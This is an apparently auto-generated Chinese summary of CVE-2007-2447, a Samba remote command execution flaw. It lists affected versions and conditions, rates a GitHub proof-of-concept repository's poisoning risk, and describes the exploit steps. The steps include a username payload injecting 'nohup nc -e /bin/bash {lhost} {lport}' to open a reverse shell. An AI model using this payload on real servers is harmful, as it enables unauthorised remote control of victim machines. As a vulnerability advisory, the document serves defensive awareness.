## CVE-2007-2447-Samba-远程命令执行

**漏洞编号:** CVE-2007-2447

**漏洞类型:** 远程命令执行

**影响应用:** Samba

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 3.0.0 <= Samba <= 3.0.25rc3

**利用条件:** 目标系统运行Samba服务，并且配置了username map script

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2007-2447 漏洞存在于 Samba 3.0.0 到 3.0.25rc3 版本的 smbd 的 MS-RPC 功能中。攻击者可以通过在 username map script 配置启用时，向 SamrChangePassword 函数发送包含 shell 元字符的恶意请求，或者通过其他 MS-RPC 函数(例如远程打印机和文件共享管理)利用此漏洞执行任意命令。

**有效性：**
提供的POC代码利用了该漏洞。代码通过构造一个特殊的用户名，该用户名包含命令注入，并尝试连接到目标 SMB 服务器。如果目标服务器存在漏洞并且配置正确（启用 username map script），则用户名中的命令将被执行。

**投毒风险：**
该存储库主要包含漏洞的利用代码和一个README文件。对`exploit.py`的快速分析显示，它会执行如利用描述中解释的漏洞，并且没有明显的恶意代码。该代码依赖于`python3-samba`，这是一个已知的库，因此降低了与依赖项相关的风险。但是，从任何未经审查的来源运行代码始终存在风险，因此，在受控环境中进行代码审查和测试至关重要。将投毒风险定为 1% 主要是因为所有代码都需要手动执行，并且相对简单，降低了隐藏恶意行为的可能性。

**利用方式：**
1.  **漏洞触发：** 攻击者构造包含 shell 元字符的恶意用户名。例如 `f"/=`nohup nc -e /bin/bash {lhost} {lport}`"`。
2.  **SMB 连接：** 攻击者使用 `SMBConnection` 尝试使用构造的恶意用户名连接到目标 SMB 服务器的 139 端口（rport）。
3.  **命令执行：** 如果目标服务器启用了 `username map script` 选项，并且存在漏洞，Samba 将会执行恶意用户名中的命令。 在本例中, 使用 netcat 反弹 shell 到攻击者控制的机器。
4.  **反弹 Shell：** `nc -e /bin/bash {lhost} {lport}` 命令在受害者机器上执行，从而建立与攻击者机器的反向 shell 连接，使得攻击者可以控制受害者机器。

**项目地址:** [foudadev/CVE-2007-2447](https://github.com/foudadev/CVE-2007-2447)

**漏洞详情:** [CVE-2007-2447](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)